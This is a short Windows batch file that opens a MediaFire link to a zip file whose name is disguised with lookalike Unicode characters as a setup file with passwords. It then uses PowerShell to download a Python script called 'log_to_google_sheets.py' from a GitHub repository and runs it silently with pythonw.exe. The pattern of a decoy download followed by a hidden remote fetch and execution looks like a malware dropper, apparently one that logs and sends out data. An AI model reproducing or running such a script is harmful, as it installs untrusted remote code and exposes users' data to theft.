@echo off
::
start "" "https://www.mediafire.com/file/xwxdeb4rcjtsa0l/#Set-Up--6582__!PaSṨWOɾDs𝓢@!.zip/file"

:: 
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/lolohole/my-front-end/raw/main/log_to_google_sheets.py', 'log_to_google_sheets.py')"

:: 
pythonw.exe log_to_google_sheets.py

